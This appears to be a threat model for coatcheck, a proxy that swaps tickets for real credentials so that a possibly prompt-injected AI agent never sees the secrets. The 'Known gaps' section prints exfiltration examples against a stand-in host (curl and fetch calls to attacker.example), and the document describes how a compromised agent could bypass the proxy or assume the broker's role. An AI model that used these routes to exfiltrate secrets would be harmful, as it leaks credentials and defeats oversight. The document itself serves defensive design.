# Threat model

## What coatcheck is for

An AI agent with shell access, a browser, and network egress processes
untrusted content (web pages, email, documents, search results, tool output).
Any of that content can carry instructions the model follows. coatcheck
assumes this happens and aims to keep real credentials out of everything the
agent can read: its process memory, environment, filesystem, logs, and model
context.

The agent receives a **ticket** (`cct_` + 64 hex chars) instead of a secret.
coatcheck swaps the ticket for the real value on the wire, after TLS
termination, on traffic it intercepts.

## Attacker

A prompt-injected or otherwise compromised agent process that:

- runs arbitrary commands and code (shell, Node, Python, Playwright),
- shares a network namespace with coatcheck (sidecar deployment), so it can
  reach every loopback listener coatcheck exposes,
- can read and change its own environment (`HTTPS_PROXY`, `NO_PROXY`, CA trust),
- holds whatever cloud identity the agent workload runs as,
- can reach the internet unless egress is enforced below the agent.

Out of scope: compromise of the coatcheck process or its container image,
compromise of the secret store, the upstream API, or the remote browser vendor.

## Deployment pattern that makes a sidecar meaningful

A broker in the same network namespace only helps if the agent cannot simply
go around it to the secret store. Three properties are required.

1. **The agent's identity is explicitly denied the secret store.** Not merely
   "not granted": an explicit deny on the secret path, so a later broad grant
   does not silently re-open it.
2. **coatcheck holds a separate identity** that can read (and, for OAuth
   refresh, write) those secrets. The agent must not be able to obtain that
   identity.
3. **Egress is enforced below the agent** so traffic cannot bypass the broker
   (see Egress below).

### Worked example: AWS (ECS/Fargate)

As shipped, the AWS provider (`packages/provider-aws/src/index.ts`) reads per-agent secrets from SSM Parameter
Store under a per-agent prefix and shared secrets from Secrets Manager, and
optionally assumes a role named by `COATCHECK_AWS_ROLE_ARN` via STS before doing so
(`packages/provider-aws/src/index.ts`).

- Agent task role: explicit `Deny` on `ssm:GetParameter*` for
  `…/user-secrets/*` and no `secretsmanager:GetSecretValue` on shared secrets.
- Broker role (one per agent): `ssm:GetParameter`, `ssm:GetParametersByPath`,
  `ssm:PutParameter` on that agent's `…/user-secrets/*`, and
  `secretsmanager:GetSecretValue` on the specific shared secrets coatcheck is
  allowed to broker.
- Verification: from inside the agent container,
  `aws ssm get-parameter --with-decryption --name …/user-secrets/x` and
  `aws secretsmanager get-secret-value --secret-id <shared>` both return
  `AccessDenied`.

**Pitfall: containers in one ECS task share one task role.** If the broker
role's trust policy trusts the task role, and the task role is allowed
`sts:AssumeRole` on the broker role, then the agent container can call
`sts:AssumeRole` itself (its SDK/CLI picks up the same task credentials from
the container credentials endpoint) and read every secret directly. The
explicit deny on the task role does not help, because the assumed broker role
is a different principal. Property 2 is violated. Ways to close it:

- Run coatcheck as a **separate task/service** with its own task role, and
  have the agent reach it over the network (then authenticate the vault API;
  see gaps).
- Keep the sidecar, but add a trust-policy condition only the broker can
  satisfy, for example an `sts:ExternalId` whose value is injected into the
  **broker container only** via a container-level secret (fetched by the
  execution role, not the task role), so the agent container never sees it.
- Block the agent container from the credentials endpoint (`169.254.170.2`)
  with egress rules, if nothing in the agent needs cloud credentials.

provider-aws supports the second option: `COATCHECK_AWS_EXTERNAL_ID` is sent as
`ExternalId` on `AssumeRole`, and coatcheck warns at startup when
`COATCHECK_AWS_ROLE_ARN` is set without it. [docs/deploy/aws-ecs.md](deploy/aws-ecs.md)
is the reference deployment for all three: task definition, IAM policies, the
per-launch-type limits on blocking `169.254.170.2`, egress rules, and CA key
handling.

### The `env` and `file` providers

Property 1 then means the agent cannot read the broker's environment or the
secrets file. Both hold real values in plaintext.

- `env`: set the `COATCHECK_SECRET_*` variables on the **coatcheck container
  only**. In a shared PID namespace, or when both processes run as the same
  OS user on one host, the agent can read `/proc/<pid>/environ`; run coatcheck
  in its own container, or as a different user.
- `file`: the agent must not be able to read `COATCHECK_SECRETS_FILE` or
  write its directory (a writable directory lets it swap the file). Don't
  mount it into the agent container; refresh writes keep mode `0600`.

Other platforms have the same shape: on Kubernetes, containers in a pod share
a service account, so a sidecar with a separate cloud identity needs either a
separate pod or a credential the agent container cannot read. On a VM, run the
broker as a different OS user with the credential readable only by that user.

## Egress: `HTTPS_PROXY` is advisory

Clients reach coatcheck because `HTTP_PROXY`/`HTTPS_PROXY` point at it. That is
a convention, not a control. A compromised agent can run `curl --noproxy '*'`,
unset the variables, or use a library that ignores them.

For secrets that only live in the broker, bypassing the proxy gains the
attacker nothing: the agent holds only tickets, and tickets resolve nowhere
else. Bypass matters for everything else the agent holds (files on disk,
tokens obtained elsewhere) and for exfiltrating data in general.

Recommendations, in order:

1. **Enforce egress below the agent.** Drop direct outbound TCP from the agent
   except to coatcheck. Examples: `iptables -A OUTPUT -o lo -j ACCEPT;
   iptables -A OUTPUT -p tcp --dport 443 -j DROP; iptables -A OUTPUT -p tcp
   --dport 80 -j DROP` set before the agent drops privileges (needs
   `NET_ADMIN` at setup), a Kubernetes `NetworkPolicy`, or a cloud security
   group that only allows the broker's egress. If the broker shares the
   agent's network namespace, rules keyed on the broker's UID (`-m owner`) are
   needed to let the broker out while blocking the agent.
2. **Domain allowlist in the broker.** Once all traffic must pass through
   coatcheck, refuse CONNECT/forward requests to hosts outside an allowlist.
   Not implemented.

Neither is needed to stop ticket redirection: coatcheck only substitutes a
ticket into requests to its secret's allowed hosts (see below), whether or not
the agent can also reach the internet directly.

## Properties that hold today

| Property | Mechanism |
|---|---|
| Real values never enter the agent's env, files, or model context via the vault API | `/_vault/*` and `/_secret/*` return tickets, never values (except fields the secret explicitly lists in `_cleartext`) (`packages/core/src/vault-handler.ts`) |
| A ticket alone is useless outside the broker | 32 random bytes; resolves only inside coatcheck's token store |
| Tickets are bound to destination hosts | Each ticket snapshots its secret's allowed hosts at mint: the intersection of the operator's policy file and the secret's in-band `_allowed_hosts` (`packages/core/src/secret-binding.ts`). Unbound secrets get no ticket (`403`) unless `COATCHECK_ALLOW_UNBOUND_SECRETS=1`. At swap time the host is the validated `CONNECT` target on HTTPS (upstream TLS verification makes it the real recipient; `Host` and SNI are ignored) and the WHATWG-parsed URL host on plain HTTP, which only matches `http://` entries, so loopback and private listeners never match unless listed. A mismatch is answered `403` (`X-Coatcheck-Denied: host-mismatch`) and nothing is forwarded; one denied ticket denies the whole request (`TokenStore.replaceAll`, `packages/core/src/mitm.ts`, `packages/core/src/forward.ts`) |
| Swapping can't redirect a request | On plain HTTP, tickets are swapped only in the path, query and headers, never in the host or userinfo that decide where the request goes (`packages/core/src/forward.ts`) |
| OAuth refresh can't send `client_secret` elsewhere | The `token_url` host must be one of the secret's allowed hosts, checked before the token endpoint is called; the refreshed ticket inherits the binding (`packages/core/src/vault-handler.ts`) |
| Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`); session-bound tickets 600 s default, 1800 s max (`packages/core/src/vault-handler.ts`) |
| `curl -v` on the agent side shows only the ticket | Substitution happens after TLS termination, on coatcheck's upstream leg |
| Session-bound (browser) tickets never resolve on HTTP(S) | `TokenStore.replaceAll` skips them (`packages/core/src/token-store.ts`) |
| Browser login tickets fill only allowed origins | Substituted only in `Input.insertText`, only when the CDP session's committed main-frame origin matches the login secret's allowed hosts; unknown origin or navigation in progress → frame dropped with a CDP error; never substituted in `Runtime.*` (`packages/core/src/cdp/origin-tracker.ts`, `packages/core/src/cdp/substitution.ts`) |
| Shared secrets are allowlisted | `/_secret/{name}` refuses names not listed under `shared` in the operator's policy file; with no policy file, it refuses every name (`packages/core/src/policy.ts`, `packages/core/src/vault-handler.ts`) |
| Secret names are validated before any provider call | `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` (no `/`, no leading `.`), checked after URL-decoding on every route that takes a name; invalid names get `400` (`isValidSecretName`, `packages/core/src/secret-provider.ts`; `packages/core/src/vault-handler.ts`) |
| Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`packages/core/src/mitm.ts`) |
| CONNECT targets cannot reach a shell or the filesystem | Targets are parsed strictly (RFC 1123 DNS name or IP literal, port 1–65535; otherwise `400`) (`packages/core/src/connect-target.ts`). Certificates are generated in-process with WebCrypto; leaf keys stay in memory (LRU, 1000 entries) and only the CA is written to disk, when `COATCHECK_CA_DIR` is set (`packages/core/src/ca.ts`). |
| Browser-service responses carry no raw CDP route | With CDP enabled, adapter hosts' JSON responses are rewritten: the Browserbase adapter points every Browserbase `ws(s)` URL (session `connectUrl`, debug endpoint `wsUrl` and `debuggerUrl`s) at the local CDP proxy and deletes `signingKey` and live-view URLs (`browser-adapters.ts`, `json-response-rewriter.ts`; attack test in `server.test.ts`) |
| Logs carry no values | Swap logs record secret names, host, and ticket age only (`packages/core/src/swap-log.ts`) |
| OAuth refresh failures don't log provider bodies | Only the HTTP status and the RFC 6749 `error` code (sanitised to `[A-Za-z0-9_.-]`, at most 64 chars) are logged (`oauthErrorCode`, `packages/core/src/vault-handler.ts`) |

## Known gaps

Severity reflects the attacker above. File references are to `packages/core/src/`.

### Fixed: tickets were not bound to destination hosts

Before roadmap item 9, any active ticket was substituted into a request to any
destination, so

```bash
TOK=$(curl -s http://127.0.0.1:3128/_vault/some-api-key | jq -r .token)
curl -x http://127.0.0.1:3128 "http://attacker.example/?k=$TOK"
```

delivered the real value to `attacker.example`, or to a listener the agent ran
itself on loopback. Both now get `403` without being forwarded (see "Tickets
are bound to destination hosts" above; `packages/core/src/server.test.ts` performs both
attacks). What remains:

- An operator who sets `COATCHECK_ALLOW_UNBOUND_SECRETS=1` reopens this hole
  for every secret that has no allowed hosts. Each such swap is logged as
  `result=unbound`.
- A secret's binding is only as narrow as its list. `*.example.com` trusts
  every subdomain, including ones a third party can host content on.
- Browser (CDP) tickets are checked against the page's main-frame origin,
  not the frame that has focus; see "Browser injection" below.

### MEDIUM: tickets are reusable until TTL

Unscoped tickets are never revoked on use; any number of requests to the
ticket's allowed hosts can carry the same ticket for 15 minutes
(`COATCHECK_TICKET_TTL_SECONDS`). Only
session-bound tickets are revoked early (on CDP disconnect). There is no
single-use option.

### LOW: `bound` MITM mode decides per tunnel, at CONNECT time

Fixed in part by roadmap item 10: interception no longer depends on whether
the token store is empty. With `COATCHECK_MITM=bound` (the default) a
`CONNECT` is intercepted when its target is a policy host, an allowed host of
a live ticket, or the browser adapter host with CDP enabled; everything else
is a raw tunnel, because no ticket could be swapped there (`mitm.ts`). The
residual: a keep-alive tunnel opened to a host bound only in-band
(`_allowed_hosts`), before the first ticket for that host was minted, stays
passthrough for its whole life. It fails closed (the upstream sees `cct_…` and
rejects it). `COATCHECK_MITM=always` intercepts everything, and
`COATCHECK_PASSTHROUGH_HOSTS` exempts cert-pinned hosts in both modes (tickets
sent there are never swapped).

### LOW: listeners are open on loopback without a token

Fixed in part by roadmap item 11. With `COATCHECK_API_TOKEN` set, the vault
API requires `Authorization: Bearer` and the proxy requires
`Proxy-Authorization` (Basic with the token as password, or Bearer); failures
get `401`/`407` before any provider call or upstream dial, and the token is
compared in constant time and never logged (`auth.ts`, `server.ts`).
`loadConfig` refuses to start on a non-loopback bind (`0.0.0.0`, `::`, any
non-`127/8` address or hostname) without a token. What remains:

- Without a token (allowed on loopback only), any process that can reach the
  loopback port, which in the sidecar pattern is anything in the agent's
  network namespace, can mint tickets. That is the agent itself, so this is
  the intended trust boundary, not a bypass; host binding limits what the
  tickets can do.
- `/_health` and `/_ca` are always open (health probes, CA bootstrap). They
  reveal the active-ticket count and the public CA certificate.
- The token is one shared secret with no per-client identity or scope; an
  agent that is given it can do everything any other client can.
- The CDP listener authenticates only by sid, a 96-bit capability delivered
  inside an intercepted browser-service response (design §4, "API token
  details").

### LOW: Host header not checked against the CONNECT target

Inside a MITM'd tunnel the request's `Host` header is forwarded untouched
while the upstream socket goes to the CONNECT hostname (`mitm.ts`). TLS
SNI from the client is not compared either. Host binding keys on the CONNECT
target (the actual upstream, verified by upstream TLS), never on `Host` or
SNI, so a mismatched `Host` can't widen a ticket's reach; it only reaches the
upstream as a confusing request.

### LOW: request bodies are swapped only on opt-in

Headers and URL are rewritten for every ticket (`mitm.ts`, `forward.ts`).
Bodies are rewritten only for secrets with `swap_body` (policy) or
`_swap_body` (in-band), because a body is where an allowed host is most
likely to echo input back to the agent (validation errors, created
objects). Opting in accepts that reflection risk for that secret: an agent
that can get an allowed host to echo a request body can read the value.
A body is only buffered and scanned when a live `swap_body` ticket could be
swapped for the host, and only up to `COATCHECK_MAX_SWAP_BODY_BYTES`; other
bodies stream unscanned, so their tickets leave as literals (fail closed).
In a scanned body host binding applies (a mis-bound ticket denies the
request; test in `server.test.ts`), and a ticket of a secret that hasn't
opted in reaches the upstream as a literal. Content-encoded bodies are not
scanned. A real value with a control character (CR/LF) is never spliced
into a header, where it would inject header lines and could desync framing
with the upstream: the request is refused with `403 invalid-value` (attack
test in `server.test.ts`). Values in the request line are percent-encoded.
The header section is capped at 64 KiB (`431`), and buffered bodies at the
cap above, so one tunnel can't grow coatcheck's memory without bound. The MITM parser frames `Transfer-Encoding: chunked` and
`Content-Length` bodies per RFC 9112 (`http1-framing.ts`), so body bytes can't
be parsed as a new request whose header tickets would be swapped. Ambiguous
framing (both headers, codings other than `chunked`, repeated or malformed
`Content-Length`, whitespace before a colon, obs-fold, malformed chunks) gets
`400` and the tunnel is closed, which refuses request smuggling between
coatcheck and the upstream. Request trailers pass through unswapped. The MITM speaks HTTP/1.1 only and advertises
just `http/1.1` over ALPN. After a `101 Switching Protocols` response the
tunnel becomes a raw pipe, so WebSocket frames are neither swapped nor
inspected.

### Browser injection

See `docs/design/cdp-injection.md` for gaps specific to the CDP path:
script on an allowed origin can read the filled value, cross-origin iframe
logins, transform-blind redaction, uninspected binary frames. **The first
and third together mean the v1 flow does not hold against an adversarial
agent** (confirmed by `examples/agents/browser-login/attack-transform.md`);
`docs/design/cdp-broker-login.md` (roadmap item 20) is the replacement.

Fixed by roadmap item 15: session-bound login tickets substituted on any
page, and inside `Runtime.evaluate` / `Runtime.callFunctionOn`, so an agent
could fill the real password into `https://attacker.example` or run
`fetch('https://attacker.example/?p=' + 'cct_…')` with the real value.
Tickets now substitute only in `Input.insertText`, only when the CDP
session's committed main-frame origin (from `Page.frameNavigated`) is one of
the login secret's allowed hosts, and never while that origin is unknown or a
navigation is in progress; otherwise the frame is dropped with a CDP error
(`cdp/origin-tracker.ts`, `cdp/substitution.ts`; attack tests in
`cdp/substitution.test.ts`, `cdp/proxy.test.ts`, and the Playwright +
Chromium `cdp/e2e.test.ts`).

Fixed by roadmap item 14: `mint-tokens` accepted any `sessionId`, so a caller
could mint credential tickets for a session that didn't exist or had already
closed. It now requires a live sid from `CdpSessionStore` and answers `404`
otherwise, before reading the credential (`vault-handler.ts`; attack tests in
`vault-handler.test.ts`).

Fixed by roadmap item 13: with a valid browser-service API-key ticket, the
agent could call Browserbase's `/v1/sessions/{id}/debug` and receive raw CDP
and live-view URLs that never pass through the CDP proxy (no substitution
gate, no redaction). The adapter now rewrites those URLs to the local proxy or
removes them, and strips `signingKey`. Remaining second routes: URL shapes the
adapter doesn't recognise, vendor endpoints outside the adapter hosts, and
browser-service hosts listed in `COATCHECK_PASSTHROUGH_HOSTS`.

## Residual risk accepted by design

- **Authenticated-action abuse.** An agent can use a credential for its
  intended purpose maliciously (delete repos, send messages, place orders).
  A broker controls where secrets go, not what an authorized call does.
- **Upstream trust.** The upstream API and the remote browser vendor see real
  values.
- **Cleartext fields.** Fields listed in a secret's `_cleartext` are returned
  to the agent as plain values by design; only list non-sensitive data (URLs,
  account ids).
